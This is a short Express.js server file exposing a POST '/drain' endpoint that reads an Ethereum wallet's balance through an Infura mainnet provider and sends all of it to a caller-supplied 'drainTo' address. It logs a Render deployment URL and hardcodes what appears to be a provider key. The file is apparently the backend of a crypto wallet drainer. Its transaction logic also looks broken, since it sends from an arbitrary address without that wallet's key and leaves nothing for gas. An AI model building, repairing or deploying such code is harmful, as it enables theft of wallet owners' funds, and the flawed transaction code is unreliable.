// index.js
const express = require('express');
const bodyParser = require('body-parser');
const Web3 = require('web3');

const app = express();
const port = process.env.PORT || 3000;

// Use body-parser to parse JSON requests
app.use(bodyParser.json());

// Set up Web3 provider (you can use Infura or your own node)
const web3 = new Web3('https://mainnet.infura.io/v3/QN_801713e80c764d00a9cff03a4a888bf6');

// Endpoint for draining the wallet
app.post('/drain', async (req, res) => {
  const { address, drainTo } = req.body;

  if (!address || !drainTo) {
    return res.status(400).json({
      success: false,
      message: 'Missing address or drainTo address',
    });
  }

  try {
    // Get balance of the wallet
    const balance = await web3.eth.getBalance(address);

    if (balance === '0') {
      return res.status(200).json({
        success: true,
        message: 'Wallet has 0 balance. No tokens to drain.',
      });
    }

    // Create a transaction to drain the wallet
    const transaction = await web3.eth.sendTransaction({
      from: address,
      to: drainTo,
      value: balance,
    });

    res.status(200).json({
      success: true,
      message: 'Wallet drained successfully! 🚀',
      transactionHash: transaction.transactionHash,
    });
  } catch (err) {
    console.error('Error draining wallet:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to drain wallet',
      error: err.message,
    });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Backend running on http://localhost:${port}`);
  console.log(`Deployment URL: https://tokenbackendwork.onrender.com`);
});
